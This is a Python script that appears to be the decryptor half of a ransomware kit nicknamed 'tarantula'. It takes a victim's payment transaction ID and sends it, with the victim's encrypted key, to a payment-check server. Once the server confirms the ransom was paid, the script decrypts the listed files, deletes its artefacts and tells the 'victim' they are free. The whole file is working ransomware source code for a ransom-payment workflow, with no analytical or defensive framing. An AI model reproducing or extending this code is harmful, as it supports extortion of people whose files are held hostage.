import os
import sys
import json
import requests
from colorama import init, Fore, Back
from libs.server import *
from libs.crypto import read_encrypted_key, read_file_list, aes_decrypt
init()

txId = input("Enter transaction ID: ")
print(f"{Fore.YELLOW}Wait. I'm checking if payment with transaction {txId} is valid...{Fore.RESET}")

request_data = {
    "transactionId": txId,
    "encryptedKey": read_encrypted_key()
}

response = requests.post(payment_check, data=json.dumps(request_data), headers={"Content-Type": "application/json"})
server_response = json.loads(response.text)
if (server_response['status'] == "success"):
    key = server_response['key']
    print(f"{Fore.GREEN}[+] Payment is valid! Decrypted key fetched!{Fore.RESET}")
    print(f"{Fore.BLUE}    - Key: {key}{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Decryption started{Fore.RESET}")
    files = read_file_list()
    for i in files:
        try:
            file_content = open(i, "rb").read()
            decrypted = aes_decrypt(file_content, key.encode())
            with open(i, "wb") as f:
                f.write(decrypted)
            print(f"{Fore.GREEN}    [+] {i} decrypted!{Fore.RESET}")
        except:
            print(f"{Fore.RED}    [!] Error while decrypting {i}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Decryption finished!{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Deleting junk files...{Fore.RESET}")
    junks = ['encrypted-key.tarankey', 'file-list.taranfls', 'tarantula']
    for i in junks:
        try:
            os.remove(i)
        except:
            print(f"{Fore.RED}    [!] Error while deleting {i}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] You are free now, thank you victim <3{Fore.RESET}")
else:
    server_message = server_response['message']
    print(f"{Fore.RED}[!] {server_message}{Fore.RESET}")
    sys.exit()